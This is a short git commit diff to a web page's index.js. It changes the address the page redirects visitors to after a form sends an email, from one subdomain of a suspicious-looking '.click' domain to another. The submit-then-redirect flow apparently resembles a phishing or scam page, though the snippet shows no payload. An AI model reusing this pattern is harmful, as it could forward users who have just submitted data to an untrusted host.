9e652daa611a6e30de6d5ac5c9b3df1137c12263
husknet <127146284+husknet@users.noreply.github.com>
2024-10-31 14:28:25 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://je.truisss-window.click';
+        window.location.href = 'https://fn.truisss-window.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
